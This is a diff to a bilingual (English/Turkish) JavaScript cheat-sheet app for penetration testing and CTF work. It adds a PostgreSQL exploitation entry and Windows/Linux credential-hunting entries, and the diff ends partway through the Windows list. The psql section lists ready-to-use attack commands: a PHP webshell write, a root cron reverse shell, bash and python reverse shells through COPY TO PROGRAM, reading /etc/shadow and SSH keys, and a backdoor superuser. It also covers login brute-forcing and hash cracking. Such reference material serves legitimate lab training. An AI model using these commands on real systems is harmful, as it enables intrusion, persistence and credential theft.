@@ -1235,7 +1235,7 @@ function setLang(lang){state.lang=lang;saveState();applyLang();renderSidebar();i
 // ═══════════════════════════════════════════════════
 //  TOOLS DB
 // ═══════════════════════════════════════════════════
-const TOOLS_ORDER = ['nmap','gobuster','ffuf','nxc','enum4linux','nikto','hydra','nuclei','peass','sqlmap','impacket','xfreerdp','hashcrack','searchsploit','evilwinrm','msfvenom','responder','kerbrute','chisel','wpscan','zap','pspy','pwncat','les','pwntools','gdb','socat','strace','binwalk'];
+const TOOLS_ORDER = ['nmap','gobuster','ffuf','nxc','enum4linux','nikto','hydra','nuclei','peass','sqlmap','impacket','xfreerdp','hashcrack','searchsploit','evilwinrm','msfvenom','responder','kerbrute','chisel','wpscan','zap','pspy','pwncat','les','pwntools','gdb','socat','strace','binwalk','psql'];
 
 const TOOLS_INFO = {
   nmap:{
@@ -1542,6 +1542,21 @@ const TOOLS_INFO = {
     platform:'lin',
     en:{summary:"binwalk is a firmware analysis and extraction tool. It scans binary files for embedded file signatures, filesystems, compressed archives, and executable code. In CTF challenges it is used on firmware images, unknown binary blobs, and steganography challenges to extract hidden files. It automatically identifies and extracts embedded content.",lookFor:["Firmware images (.bin, .img, .rom) — extract filesystem for analysis","Embedded filesystems: squashfs, cramfs, jffs2, ext2","Compressed data: gzip, lzma, zip embedded in binary","Bootloader or kernel images — find hardcoded credentials","Steganography challenges — hidden data appended to images or archives","Custom binary format CTF challenges — find embedded flags or data"],vulns:["Squashfs filesystem extraction → find /etc/passwd, credentials, private keys","Bootloader credential extraction → default admin passwords hardcoded","Hidden zip/tar inside image → extract and analyze contents","Kernel image analysis → find hardcoded IPs, credentials, debug strings","LZMA-compressed payload extraction → decompress and analyze binary"],creds:["Basic scan: binwalk firmware.bin","Extract all: binwalk -e firmware.bin (creates _firmware.bin.extracted/)","Recursive extract: binwalk -Me firmware.bin (extracts nested archives)","Force extract: binwalk -e --run-as=root firmware.bin","After extract: find . -name '*.conf' -o -name 'passwd' -o -name '*.key' 2>/dev/null"]},
     tr:{summary:"binwalk, firmware analizi ve çıkarma aracıdır. Binary dosyaları gömülü dosya imzaları, dosya sistemleri, sıkıştırılmış arşivler ve çalıştırılabilir kod için tarar. CTF challenge'larında firmware görüntüleri, bilinmeyen binary blob'lar ve steganografi challenge'larında gizli dosyaları çıkarmak için kullanılır. Gömülü içeriği otomatik olarak tanımlar ve çıkarır.",lookFor:["Firmware görüntüleri (.bin, .img, .rom) — analiz için dosya sistemini çıkar","Gömülü dosya sistemleri: squashfs, cramfs, jffs2, ext2","Binary'ye gömülü sıkıştırılmış veri: gzip, lzma, zip","Bootloader veya kernel görüntüleri — hardcoded credential'ları bul","Steganografi challenge'ları — görüntülere veya arşivlere eklenen gizli veriler","Özel binary format CTF challenge'ları — gömülü flag veya veri bul"],vulns:["Squashfs dosya sistemi çıkarma → /etc/passwd, credential, private key bul","Bootloader credential çıkarma → hardcoded varsayılan admin şifreleri","Görüntü içinde gizli zip/tar → çıkar ve içeriği analiz et","Kernel görüntü analizi → hardcoded IP, credential, debug string bul","LZMA sıkıştırılmış payload çıkarma → sıkıştırmayı aç ve binary analiz et"],creds:["Temel tarama: binwalk firmware.bin","Hepsini çıkar: binwalk -e firmware.bin (_firmware.bin.extracted/ oluşturur)","Özyinelemeli çıkar: binwalk -Me firmware.bin (iç içe arşivleri çıkarır)","Zorla çıkar: binwalk -e --run-as=root firmware.bin","Çıkardıktan sonra: find . -name '*.conf' -o -name 'passwd' -o -name '*.key' 2>/dev/null"]},
+  },
+  psql:{
+    platform:'lin',
+    en:{
+      summary:"PostgreSQL is a powerful open-source RDBMS running on port 5432. When you gain access — via credentials, misconfigured trust auth, or SQL injection — you can use psql for enumeration, file read/write, and remote code execution. The key privilege is superuser: it unlocks COPY FROM PROGRAM (OS command execution), pg_read_file (read any server file), and direct file writes. Start by checking if you are superuser.",
+      lookFor:["Whether connected user is superuser — SELECT current_setting('is_superuser')","pg_hba.conf trust entries — allow passwordless login from localhost","COPY privilege — required for file read/write via COPY TO/FROM","pg_read_file availability — superuser function to read any filesystem file","dblink extension — query other PostgreSQL instances on the network","Credentials in pg_shadow / pg_authid — crack MD5 hashes offline","Application tables with user data — users, credentials, sessions, secrets"],
+      vulns:["COPY TO PROGRAM — execute OS commands as the postgres OS user (superuser, PostgreSQL 9.3+, CVE-2019-9193)","pg_read_file() — read any file accessible by the postgres OS user (superuser only)","COPY TO FILE — write arbitrary files to postgres-writable paths","ALTER USER postgres PASSWORD — change superuser password if you have superuser rights","Trust auth in pg_hba.conf — passwordless login from localhost as any user","pg_shadow password hashes — crack offline with hashcat -m 10"],
+      creds:["Default port: 5432. First try: psql -h TARGETIP -U postgres","Common defaults: postgres:postgres, postgres:(empty), admin:admin, pgsql:pgsql","Always check: SELECT current_user, session_user, current_setting('is_superuser');","pg_shadow hashes: format is md5 + md5(password + username). Crack: hashcat -m 10 'md5HASH' -u username","Trust auth check: cat /etc/postgresql/*/main/pg_hba.conf on the box","COPY FROM PROGRAM needs superuser — verify before attempting"],
+    },
+    tr:{
+      summary:"PostgreSQL, 5432 portunda çalışan güçlü bir açık kaynaklı RDBMS'dir. Credential, yanlış yapılandırılmış trust auth veya SQL injection yoluyla erişim sağlandığında psql; enumeration, dosya okuma/yazma ve uzak kod yürütme için kullanılabilir. Anahtar yetki superuser'dır: COPY FROM PROGRAM (OS komut yürütme), pg_read_file (herhangi bir sunucu dosyasını okuma) ve doğrudan dosya yazma işlemlerinin kilidini açar. İlk olarak superuser olup olmadığını kontrol et.",
+      lookFor:["Bağlı kullanıcının superuser olup olmadığı — SELECT current_setting('is_superuser')","pg_hba.conf trust girişleri — localhost'tan şifresiz giriş imkanı","COPY privilege — COPY TO/FROM ile dosya okuma/yazma için gerekli","pg_read_file kullanılabilirliği — herhangi bir dosyayı okuyabilen superuser fonksiyonu","dblink extension — ağdaki diğer PostgreSQL örneklerini sorgula","pg_shadow / pg_authid'deki credential'lar — MD5 hash'lerini çevrimdışı kır","Uygulama tablolarındaki kullanıcı verileri — users, credentials, sessions, secrets"],
+      vulns:["COPY TO PROGRAM — postgres OS kullanıcısı olarak OS komutları çalıştır (superuser, PostgreSQL 9.3+, CVE-2019-9193)","pg_read_file() — postgres OS kullanıcısının erişebildiği herhangi bir dosyayı oku (sadece superuser)","COPY TO FILE — postgres'in yazabildiği yollara rastgele dosya yaz","ALTER USER postgres PASSWORD — superuser haklarınız varsa superuser şifresini değiştir","pg_hba.conf'ta Trust auth — localhost'tan herhangi bir kullanıcı olarak şifresiz giriş","pg_shadow parola hash'leri — hashcat -m 10 ile çevrimdışı kır"],
+      creds:["Varsayılan port: 5432. İlk dene: psql -h TARGETIP -U postgres","Yaygın varsayılanlar: postgres:postgres, postgres:(boş), admin:admin","Her zaman kontrol et: SELECT current_user, session_user, current_setting('is_superuser');","pg_shadow hash'leri: md5 + md5(parola + kullanıcıadı). Kır: hashcat -m 10","Trust auth kontrolü: cat /etc/postgresql/*/main/pg_hba.conf","COPY FROM PROGRAM superuser gerektirir — denemeden önce doğrula"],
+    },
   },
 };
 
@@ -2557,6 +2572,67 @@ const TOOLS_DB = {
       ]},
     ],
   },
+  psql:{
+    label:'psql', desc:'PostgreSQL Client & Exploitation',
+    categories:[
+      {name:'Connection & Initial Access',cmds:[
+        {p:'Connect with psql (standard)',c:'psql -h TARGETIP -U postgres -p 5432',h:'Default connection. Press \\q to quit. If no password prompt appears → trust auth enabled (excellent!). Try: postgres, admin, root as username.'},
+        {p:'Connect to specific database',c:'psql -h TARGETIP -U postgres -d postgres\npsql -h TARGETIP -U postgres -d template1',h:'Specify database with -d. Default DBs: postgres, template1. Switch inside psql with: \\c dbname'},
+        {p:'Connect with password (env var)',c:'PGPASSWORD="password" psql -h TARGETIP -U postgres',h:'Set PGPASSWORD to avoid interactive prompt. Useful in scripts. Try: postgres, admin, (empty string).'},
+        {p:'Try common default credentials',c:'# Try these in order:\npsql -h TARGETIP -U postgres\nPGPASSWORD="postgres" psql -h TARGETIP -U postgres\nPGPASSWORD="admin" psql -h TARGETIP -U postgres\nPGPASSWORD="" psql -h TARGETIP -U postgres',h:'Common creds: postgres:postgres, postgres:(empty), admin:admin, pgsql:pgsql. Also try username=hostname.'},
+        {p:'Nmap PostgreSQL scripts',c:'nmap -sV -p 5432 TARGETIP\nnmap -p 5432 --script=pgsql-empty-password TARGETIP\nnmap -p 5432 --script=pgsql-brute --script-args brute.mode=user TARGETIP',h:'pgsql-empty-password checks for blank password. pgsql-brute does credential brute-force.'},
+        {p:'Hydra brute-force',c:'hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt TARGETIP postgres',h:'Brute-force PostgreSQL login. Use -l postgres to target single user. -t 4 to avoid connection errors.'},
+        {p:'Local login (OS shell on box)',c:'sudo -u postgres psql\n# or:\nsu postgres -c psql\n# or:\nrunuser -l postgres -c psql',h:'If you have a shell on the box and postgres user is available — no password needed via OS trust.'},
+      ]},
+      {name:'Enumeration',cmds:[
+        {p:'Current user & superuser check',c:'SELECT current_user, session_user, current_setting(\'is_superuser\');',h:'FIRST COMMAND to run. is_superuser=on → full exploitation path available. Note both current_user and session_user.'},
+        {p:'PostgreSQL version',c:'SELECT version();',h:'Version matters — COPY TO PROGRAM requires 9.3+. Check for version-specific CVEs.'},
+        {p:'List all databases',c:'\\l\n-- or SQL:\nSELECT datname, pg_catalog.pg_get_userbyid(datdba) AS owner FROM pg_database;',h:'\\l shows all databases with owners and encoding. Switch DB with: \\c dbname'},
+        {p:'List tables in current database',c:'\\dt\n-- All schemas:\n\\dt *.*\n-- or SQL:\nSELECT table_schema, table_name FROM information_schema.tables WHERE table_type=\'BASE TABLE\' ORDER BY 1,2;',h:'Look for non-system tables: focus on public schema. Table names like users, creds, accounts, secrets are high-value.'},
+        {p:'List all users and roles',c:'\\du\n-- With password hashes (superuser only):\nSELECT usename, usesuper, usecreatedb, usecreaterole, passwd FROM pg_shadow;',h:'\\du shows roles and their privileges. pg_shadow shows password hashes — superuser only. Look for other superusers.'},
+        {p:'Check loaded extensions',c:'SELECT * FROM pg_extension;\nSELECT * FROM pg_available_extensions WHERE installed_version IS NOT NULL;',h:'Look for: dblink (lateral movement), adminpack, pg_execute_server_program. Each adds exploitation options.'},
+        {p:'Show config file paths',c:'SHOW config_file;\nSHOW hba_file;\nSHOW data_directory;',h:'Know where config files live. Use pg_read_file() on these paths if superuser to read pg_hba.conf.'},
+        {p:'Check own privileges on schemas/tables',c:'SELECT has_table_privilege(current_user, \'pg_shadow\', \'SELECT\');\nSELECT grantee, table_name, privilege_type FROM information_schema.role_table_grants WHERE grantee=current_user;',h:'Check if you can read sensitive tables like pg_shadow. Useful when is_superuser=off.'},
+      ]},
+      {name:'File Read (Superuser)',cmds:[
+        {p:'pg_read_file — read any file',c:'SELECT pg_read_file(\'/etc/passwd\');\nSELECT pg_read_file(\'/etc/shadow\');\nSELECT pg_read_file(\'/root/.ssh/id_rsa\');',h:'Superuser only. Reads files accessible by the postgres OS user. First try sensitive files: /etc/passwd, /etc/shadow, SSH keys.'},
+        {p:'Read pg_hba.conf (auth config)',c:'SELECT pg_read_file(current_setting(\'hba_file\'));',h:'Shows authentication rules. Look for trust entries (passwordless access) or md5 entries with predictable passwords.'},
+        {p:'Read web app config files',c:'SELECT pg_read_file(\'/var/www/html/.env\');\nSELECT pg_read_file(\'/var/www/html/config.php\');\nSELECT pg_read_file(\'/opt/app/settings.py\');',h:'DB passwords, API keys, Django SECRET_KEY. Try common web root paths: /var/www/html, /srv/www, /opt/app.'},
+        {p:'COPY FROM — read file into table',c:'CREATE TABLE tmp_file(data TEXT);\nCOPY tmp_file FROM \'/etc/passwd\';\nSELECT * FROM tmp_file;\nDROP TABLE tmp_file;',h:'Alternative to pg_read_file. Works for text files. Fails on binary files. Requires COPY privilege (usually superuser).'},
+        {p:'pg_read_binary_file — binary files',c:'SELECT encode(pg_read_binary_file(\'/var/lib/postgresql/.ssh/id_rsa\'),\'escape\');\nSELECT encode(pg_read_binary_file(\'/etc/shadow\'),\'escape\');',h:'Reads binary files. Use encode(data, \'hex\') for hex output or \'escape\' for escaped string output.'},
+      ]},
+      {name:'File Write (Superuser)',cmds:[
+        {p:'Write PHP webshell via COPY',c:'COPY (SELECT $$<?php system($_GET["cmd"]); ?>$$) TO \'/var/www/html/shell.php\';',h:'Writes query result to file. Needs postgres write permission on path. Access: http://TARGETIP/shell.php?cmd=id — then upgrade to reverse shell.'},
+        {p:'Write reverse shell cron job',c:'COPY (SELECT $$* * * * * root bash -i >& /dev/tcp/TARGETIP/TARGETPORT 0>&1$$) TO \'/etc/cron.d/rshell\';',h:'Writes root cron job if postgres can write /etc/cron.d. Fires every minute. Set up listener first: nc -lvnp TARGETPORT'},
+        {p:'Write SSH authorized_keys',c:'COPY (SELECT $$ssh-rsa AAAA...YOUR_PUBKEY... user@host$$) TO \'/var/lib/postgresql/.ssh/authorized_keys\';',h:'Add your public key for SSH as postgres user. Generate: ssh-keygen -t rsa. Then: ssh postgres@TARGETIP -i id_rsa'},
+        {p:'Write /etc/passwd new root user',c:'-- First read current /etc/passwd:\nSELECT pg_read_file(\'/etc/passwd\');\n-- Generate hash: openssl passwd -1 hacked\n-- Append: not directly possible with COPY TO (overwrites)\n-- Use COPY FROM PROGRAM instead (see RCE section)',h:'COPY TO overwrites — use COPY FROM PROGRAM to append: echo "hacker:HASH:0:0::/root:/bin/bash" >> /etc/passwd'},
+      ]},
+      {name:'Remote Code Execution (COPY FROM PROGRAM)',cmds:[
+        {p:'Test RCE — check user and version',c:'CREATE TABLE rce_out(line TEXT);\nCOPY rce_out FROM PROGRAM \'id\';\nSELECT * FROM rce_out;\nDROP TABLE rce_out;',h:'CRITICAL: Superuser + PostgreSQL 9.3+. Executes OS command as the postgres OS user. This is the main RCE primitive.'},
+        {p:'RCE — reverse shell (bash)',c:'COPY (SELECT 1) TO PROGRAM $$bash -c "bash -i >& /dev/tcp/TARGETIP/TARGETPORT 0>&1"$$;',h:'Executes reverse shell as postgres OS user. Set up listener first: nc -lvnp TARGETPORT. $$ avoids quote escaping.'},
+        {p:'RCE — reverse shell (python)',c:'COPY (SELECT 1) TO PROGRAM $$python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\'TARGETIP\',TARGETPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/sh\'])"$$;',h:'Python reverse shell. Useful when bash /dev/tcp is blocked.'},
+        {p:'RCE — read command output',c:'CREATE TABLE cmd_out(line TEXT);\nCOPY cmd_out FROM PROGRAM \'cat /etc/shadow\';\nSELECT * FROM cmd_out;\nDROP TABLE cmd_out;',h:'Read command output line by line. Works for: cat, id, ls, whoami, ps, env. Each line becomes a table row.'},
+        {p:'RCE — write file via echo',c:'COPY (SELECT 1) TO PROGRAM $$bash -c "echo ssh-rsa YOURPUBKEY >> /var/lib/postgresql/.ssh/authorized_keys"$$;',h:'Append to files using echo via PROGRAM. Useful when COPY TO fails due to permissions.'},
+        {p:'sqlmap — automated RCE via SQLi',c:'sqlmap -u "http://TARGETIP/page?id=1" --dbms=postgresql --os-shell\nsqlmap -u "http://TARGETIP/page?id=1" --dbms=postgresql --os-cmd="id"',h:'sqlmap automates COPY FROM PROGRAM for RCE via SQL injection. --os-shell gives interactive shell.'},
+      ]},
+      {name:'Credential Extraction & PrivEsc',cmds:[
+        {p:'Dump password hashes (pg_shadow)',c:'SELECT usename, passwd FROM pg_shadow;',h:'Superuser only. Hash format: md5 + md5(password + username). Crack: hashcat -m 10 "md5HASH" --username (use usename as salt).'},
+        {p:'Crack pg_shadow hash with hashcat',c:'# Format the hash for hashcat:\n# hashcat expects: hash:salt → here salt = username\nhashcat -m 10 \'md5abc123def456...:postgres\' /usr/share/wordlists/rockyou.txt',h:'hashcat mode 10 = md5($pass.$salt). The salt is the PostgreSQL username. Strip the leading "md5" before feeding to hashcat.'},
+        {p:'Change superuser password',c:'ALTER USER postgres WITH PASSWORD \'newpassword\';',h:'Changes postgres superuser password. Use for persistence or to enable remote login if it was disabled.'},
+        {p:'Create new superuser backdoor',c:'CREATE USER hacker WITH SUPERUSER LOGIN PASSWORD \'hacked123\';\n-- Verify:\nSELECT usename, usesuper FROM pg_shadow WHERE usename=\'hacker\';',h:'Creates a backdoor superuser account. Check pg_hba.conf allows remote connections for the new user.'},
+        {p:'Escalate via pg_read_server_files role',c:'-- PostgreSQL 11+: grant file access without full superuser:\nGRANT pg_read_server_files TO current_user;\nGRANT pg_write_server_files TO current_user;\nGRANT pg_execute_server_program TO current_user;',h:'PostgreSQL 11+ predefined roles. If you can GRANT these (CREATEROLE), you get file/exec access without superuser flag.'},
+        {p:'Reset password from OS shell',c:'# On the box — no password needed:\nsudo -u postgres psql -c "ALTER USER postgres WITH PASSWORD \'hacked\';"',h:'If you have an OS shell — directly reset DB password. Also works via: su postgres and then psql.'},
+      ]},
+      {name:'Useful Queries & Navigation',cmds:[
+        {p:'Dump application table data',c:'SELECT * FROM users LIMIT 50;\nSELECT * FROM credentials LIMIT 20;\nSELECT * FROM accounts LIMIT 20;\nSELECT * FROM sessions LIMIT 20;',h:'Check high-value table names first. User data, hashed passwords, session tokens, API keys are common finds.'},
+        {p:'Search for password columns',c:'SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE column_name ILIKE \'%pass%\' OR column_name ILIKE \'%secret%\' OR column_name ILIKE \'%token%\' OR column_name ILIKE \'%hash%\';',h:'Finds credential-related columns across all tables. ILIKE = case-insensitive. Target every result.'},
+        {p:'psql meta-commands (cheatsheet)',c:'\\l          -- list databases\n\\c DBNAME   -- connect to database\n\\dt         -- list tables (public schema)\n\\dt *.*     -- list all tables all schemas\n\\du         -- list users/roles\n\\df         -- list functions\n\\dn         -- list schemas\n\\dx         -- list extensions\n\\q          -- quit psql\n\\?          -- help for meta-commands\n\\h SELECT   -- SQL help',h:'These are psql client commands — NOT SQL. They work interactively in psql. Tab-completion works for most.'},
+        {p:'Run SQL non-interactively (one-liner)',c:'psql -h TARGETIP -U postgres -c "SELECT version();"',h:'-c runs a single SQL command and exits. Useful for scripting or quick checks without opening interactive session.'},
+        {p:'Run SQL file',c:'psql -h TARGETIP -U postgres -f exploit.sql',h:'-f executes a .sql file. Create a file with all your commands for repeatable exploitation.'},
+        {p:'Check network connections from DB',c:'SELECT client_addr, usename, datname, state, query FROM pg_stat_activity;',h:'Shows active connections to PostgreSQL. Reveals application server IPs, DB names in use, and running queries.'},
+      ]},
+    ],
+  },
   'revshell-lin':{
     label:'revshell-lin', desc:'Linux Reverse Shells',
     categories:[
@@ -2671,6 +2747,7 @@ const TOOLS_DB = {
 //  ENUM DB (AD / Linux)
 // ═══════════════════════════════════════════════════
 const ENUM_ORDER = ['ad','linux'];
+const REGEX_ORDER = ['regex-win','regex-lin'];
 
 const ENUM_INFO = {
   ad:{
@@ -2701,6 +2778,36 @@ const ENUM_INFO = {
       lookFor:["sudo -l çıktısı — parola olmadan çalıştırılabilir komutlar","Standart olmayan SUID/SGID binary'ler — GTFObins'i kontrol et","Cron/systemd tarafından çalıştırılan dünya yazılabilir script veya binary'ler","Config dosyalarında, .bash_history'de, ortam değişkenlerinde credential'lar","Kernel versiyonu — yerel yetki yükseltme CVE'leriyle karşılaştır","no_root_squash ile NFS exportları","Yazılabilir PATH dizinleri — binary hijacking","Yazılabilir config veya binary'lere sahip root olarak çalışan servisler","Binary'lerde ayarlı capability'ler (getcap -r /)","Container içindeyse Docker/LXC container kaçışı"],
       vulns:["sudo -l → GTFObins girişi = anında root","GTFObins'te SUID binary = root shell","Yazılabilir /etc/passwd → root kullanıcı ekle","Root olarak çalıştırılan yazılabilir cron scripti → reverse shell","NFS no_root_squash → SUID shell yerleştir","cap_setuid capability → python -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'","Yazılabilir /etc/sudoers → NOPASSWD girişi ekle","Kernel exploit: DirtyCow (2.6-3.9), OverlayFS, PwnKit (polkit)"],
       creds:["Shell aldıktan hemen sonra id, whoami, sudo -l çalıştır","Otomatik enumeration için linPEAS kullan — ama manuel komutları da anla","DB credential'ları için /var/www, /opt, /srv'yi kontrol et","History dosyaları altındır: .bash_history, .zsh_history, .python_history","/etc/hosts dahili ağ topolojisini ortaya çıkarır",".ssh dizinlerini ara — private key'ler hostlar arasında yeniden kullanılabilir","ss -tlnp dışarıdan görünmeyen dinleyen servisleri gösterir"],
+    },
+  },
+  'regex-win':{
+    platform:'win',
+    en:{
+      summary:"Windows regex and grep patterns for credential hunting, file discovery, and hash identification during post-exploitation. Commands use findstr (built-in) and PowerShell Select-String for pattern matching. Covers password hunting in files, Active Directory credential files, registry credential stores, and common hash formats.",
+      lookFor:["Password/credential strings in config files and scripts","Unattended install files (unattend.xml, sysprep.xml) — often contain plaintext creds","Group Policy Preferences XML files — encrypted (but crackable) passwords via MS14-025","PowerShell history files — may contain credentials typed as command arguments","Registry autologon, PuTTY sessions, WinSCP — store cleartext or weak-encrypted creds","Web.config and applicationHost.config — DB connection strings with passwords","KeePass (.kdbx) files — offline password databases"],
+      vulns:["MS14-025: GPP cpassword — decryptable with gpp-decrypt","AutoLogon DefaultPassword in registry — stored in cleartext","WinSCP session passwords — weak XOR encryption, trivially decoded","PuTTY saved sessions — may contain private key passphrases","PowerShell history — cmdlets often include -Password flags with values","Unattend.xml — base64 admin credentials left by sysadmins"],
+      creds:["Always search recursively from C:\\","Use 'dir /s /b' for file discovery and 'findstr /si' for content search","PowerShell Get-ChildItem -Recurse is more powerful than dir","Check all user profiles: C:\\Users\\*\\AppData and Desktop","Don't forget mapped network drives and writable shares"],
+    },
+    tr:{
+      summary:"Post-exploitation sırasında credential avı, dosya keşfi ve hash tanımlaması için Windows regex ve grep kalıpları. Komutlar yerleşik findstr ve PowerShell Select-String kullanır. Dosyalarda parola avı, AD credential dosyaları, registry credential depoları ve yaygın hash formatlarını kapsar.",
+      lookFor:["Config dosyalarında ve scriptlerde parola/credential stringleri","Gözetimsiz kurulum dosyaları (unattend.xml, sysprep.xml) — genellikle düz metin cred içerir","GPP XML dosyaları — MS14-025 ile kırılabilir şifreli parolalar","PowerShell geçmiş dosyaları — komut argümanı olarak yazılan credential içerebilir","Autologon, PuTTY, WinSCP registry anahtarları — zayıf şifreli credential depolar","Web.config ve applicationHost.config — parolalı DB bağlantı stringleri","KeePass (.kdbx) dosyaları — çevrimdışı parola veritabanları"],
+      vulns:["MS14-025: GPP cpassword — gpp-decrypt ile çözülebilir","Registry AutoLogon DefaultPassword — düz metin","WinSCP oturum parolaları — zayıf XOR şifreleme","PuTTY kayıtlı oturumlar — private key parolalarını içerebilir","PowerShell geçmişi — cmdlet'ler -Password bayraklarını değerleriyle içerir","Unattend.xml — sysadmin'lerin bıraktığı base64 admin credential"],
+      creds:["Her zaman C:\\'den özyinelemeli ara","Dosya keşfi için 'dir /s /b', içerik araması için 'findstr /si' kullan","PowerShell Get-ChildItem -Recurse daha güçlüdür","Tüm kullanıcı profillerini kontrol et: C:\\Users\\*\\AppData ve Desktop","Eşlenmiş ağ sürücülerini ve yazılabilir paylaşımları unutma"],
+    },
+  },
+  'regex-lin':{
+    platform:'lin',
+    en:{
+      summary:"Linux grep patterns and file discovery commands for credential hunting and privilege escalation during post-exploitation. Covers password hunting in config files, SSH private key discovery, web application credentials, hash format identification, and privilege escalation indicators (SUID binaries, world-writable paths, sudo misconfigs).",
+      lookFor:["Password strings in config files under /etc, /var/www, /opt, /home",".bash_history and shell history files — commands with passwords typed inline","SSH private key files (id_rsa, id_ecdsa, id_ed25519) in .ssh directories",".netrc files — contain plaintext FTP/HTTP credentials","Database config files — wp-config.php, settings.py, database.yml, .env","Cron jobs running as root with writable scripts","SUID binaries not in standard Linux install — check GTFOBins"],
+      vulns:["World-readable /etc/shadow — crack hashes offline with hashcat/john","SSH private key without passphrase — instant access to other hosts",".netrc with credentials — often reused passwords","WordPress wp-config.php DB password — may unlock shell via MySQL or phpMyAdmin",".env files — API keys, DB passwords, JWT secrets for web apps","History files with sudo passwords typed as -p flag"],
+      creds:["grep -rn is your friend — always use 2>/dev/null to suppress errors","Check /var/backups for password backups","Don't forget /proc/*/cmdline — processes may have passwords as args","Use 'strings' on binary config files for embedded credentials","find -readable is more reliable than permission-based filters"],
+    },
+    tr:{
+      summary:"Post-exploitation sırasında credential avı ve yetki yükseltme için Linux grep kalıpları ve dosya keşif komutları. Config dosyalarında parola avı, SSH private key keşfi, web uygulaması credential'ları, hash format tanımlaması ve yetki yükseltme göstergelerini (SUID, dünya yazılabilir, sudo yanlış yapılandırma) kapsar.",
+      lookFor:["/etc, /var/www, /opt, /home altındaki config dosyalarında parola stringleri",".bash_history ve shell geçmiş dosyaları — satır içi yazılmış parolalı komutlar",".ssh dizinlerinde SSH private key dosyaları (id_rsa, id_ecdsa, id_ed25519)",".netrc dosyaları — düz metin FTP/HTTP credential içerir","Veritabanı config dosyaları — wp-config.php, settings.py, database.yml, .env","Yazılabilir scriptlerle root olarak çalışan cron joblar","Standart Linux kurulumunda olmayan SUID binary'ler — GTFOBins'i kontrol et"],
+      vulns:["Dünya okunabilir /etc/shadow — hashcat/john ile çevrimdışı kır","Parola olmadan SSH private key — diğer hostlara anında erişim","Credential'lı .netrc — genellikle yeniden kullanılan parolalar","WordPress wp-config.php DB parolası — MySQL veya phpMyAdmin ile shell",".env dosyaları — web uygulamaları için API anahtarları, DB parolaları, JWT secret","-p bayrağıyla yazılmış sudo parolalarını içeren geçmiş dosyaları"],
+      creds:["grep -rn senin arkadaşın — izin hatalarını bastırmak için 2>/dev/null kullan","Parola yedekleri için /var/backups kontrol et","/proc/*/cmdline'ı unutma — çalışan işlemler argüman olarak parola içerebilir","Gömülü credential'lar için ikili config dosyalarında 'strings' kullan","-readable ile find daha güvenilirdir"],
     },
   },
 };
@@ -2817,13 +2924,110 @@ const ENUM_DB = {
       ]},
     ],
   },
+  'regex-win':{
+    label:'Regex: Win', desc:'Credential & Pattern Hunting',
+    categories:[
+      {name:'Credential Hunting — File Content',cmds:[
+        {p:'Password string in common file types',c:'findstr /si "password" *.txt *.xml *.ini *.config *.cfg *.yaml *.yml',h:'Run from C:\\ for full system coverage. /s=recursive /i=case-insensitive. First command to run after shell.'},
+        {p:'Multiple credential keywords',c:'findstr /si /c:"password" /c:"passwd" /c:"secret" /c:"credential" /c:"apikey" /c:"api_key" *.txt *.xml *.ini *.config *.json *.yaml',h:'Use /c: for OR-style multi-keyword search. Run from C:\\ or target app directories.'},
+        {p:'PowerShell — regex credential search',c:'Get-ChildItem -Path C:\\ -Recurse -Include *.txt,*.xml,*.ini,*.config,*.json,*.yaml -ErrorAction SilentlyContinue | Select-String -Pattern "(password|passwd|pwd|secret)\\s*[=:]" -CaseSensitive:$false',h:'Full .NET regex support. Matches password= and password: patterns. Slower than findstr — target specific dirs.'},
+        {p:'Connection strings with embedded passwords',c:'findstr /si /c:"connectionString" /c:"Data Source" /c:"password=" /c:"pwd=" *.xml *.config *.cfg',h:'Finds database connection strings. Common in web.config and app.config. Run from C:\\inetpub or app root.'},
+        {p:'API keys and tokens',c:'findstr /si /c:"api_key" /c:"apikey" /c:"access_token" /c:"secret_key" /c:"client_secret" *.json *.yaml *.xml *.config *.env *.txt',h:'Catches API credentials in config files. Look for AWS/Azure/GCP keys and service tokens.'},
+        {p:'Private key headers in text files',c:'findstr /si /c:"BEGIN RSA PRIVATE" /c:"BEGIN OPENSSH PRIVATE" /c:"BEGIN EC PRIVATE" *.pem *.key *.txt *.ppk',h:'Finds embedded private keys in text files. .ppk = PuTTY key format. Check entire filesystem.'},
+      ]},
+      {name:'Active Directory & System Files',cmds:[
+        {p:'GPP cpassword — MS14-025 (CRITICAL)',c:'findstr /s /i "cpassword" C:\\Windows\\SYSVOL\\domain\\Policies\\*.xml',h:'Group Policy Preferences stored encrypted passwords. Key is public — crack with: gpp-decrypt HASH'},
+        {p:'PowerShell history (current user)',c:'type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt',h:'Commands typed in PS sessions — often includes credentials passed as -Password arguments.'},
+        {p:'PowerShell history (all users)',c:'Get-ChildItem "C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt" -ErrorAction SilentlyContinue | Get-Content',h:'Checks every user profile for PS history. High value if admins used PS with -Password flags.'},
+        {p:'Unattend / Sysprep files',c:'dir /s /b unattend.xml sysprep.xml sysprep.inf unattended.xml 2>nul',h:'Left over from Windows deployment — often contain base64 admin passwords. Decode: [Convert]::FromBase64String("STRING")'},
+        {p:'SAM / SYSTEM / NTDS.dit',c:'dir /s /b SAM SYSTEM ntds.dit 2>nul',h:'SAM+SYSTEM = offline hash extraction via secretsdump. NTDS.dit = full AD password database. Usually in C:\\Windows\\NTDS\\'},
+        {p:'IIS web.config files',c:'dir /s /b web.config 2>nul\nfindstr /si /c:"password" /c:"connectionString" C:\\inetpub\\wwwroot\\web.config 2>nul',h:'Contains DB connection strings and app credentials. Also check applicationHost.config for app pool service accounts.'},
+      ]},
+      {name:'File Name Discovery',cmds:[
+        {p:'KeePass databases',c:'dir /s /b *.kdbx *.kdb 2>nul',h:'KeePass password manager databases. Crack master password with hashcat -m 13400. May be unlocked in memory if running.'},
+        {p:'VPN and RDP config files',c:'dir /s /b *.rdp *.ovpn *.pcf 2>nul',h:'.rdp files may have saved credentials. .ovpn/.pcf = VPN configs with embedded certs and credentials.'},
